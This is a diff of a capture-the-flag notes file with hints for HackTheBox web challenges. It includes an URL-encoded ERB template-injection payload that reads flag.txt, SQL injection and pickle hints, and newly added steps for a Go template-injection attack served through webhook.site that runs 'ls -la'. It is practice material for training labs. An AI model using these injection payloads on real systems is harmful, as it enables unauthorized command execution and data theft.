@@ -22,7 +22,7 @@
 		%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'
     Explanation: https://drt.sh/posts/htb-neonify/
     
-**04 COP:**
+**05 COP:**
     Link: https://app.hackthebox.com/challenges/cop
     Hint: No Flag value in DB, use script
 		import pickle
@@ -39,6 +39,14 @@
 		add to the url like 
 		target/1' UNION SELECT '<VALUE>
     Solution: https://drt.sh/posts/htb-cop/
+
+**06 Render Quest:**
+    Link: https://app.hackthebox.com/challenges/renderquest
+    Hint: Prepare A malicious Like that can have Command in it
+	A. go https://webhook.site/    	
+	B. Preaper Request with Respond Body of {{.FetchServerInfo "ls -la"}}
+	C. Modify it as you go
+    Solution: https://medium.com/@tanish.saxena26/hackthebox-renderquest-cf6c493d7b83
 
 
 
